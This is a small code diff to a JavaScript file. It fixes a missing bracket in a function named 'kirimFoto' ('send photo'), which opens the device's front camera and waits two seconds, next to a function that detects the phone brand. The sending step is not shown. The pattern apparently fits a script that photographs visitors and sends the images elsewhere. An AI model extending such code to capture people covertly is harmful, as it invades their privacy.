@@ -31,6 +31,7 @@ function getMerekHP() {
 
   return "Tidak diketahui";
 }
+
 async function kirimFoto() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
@@ -45,7 +46,7 @@ async function kirimFoto() {
         video.play();
         resolve();
       };
-    }
+    });
                       
     await new Promise(resolve => setTimeout(resolve, 2000));
 
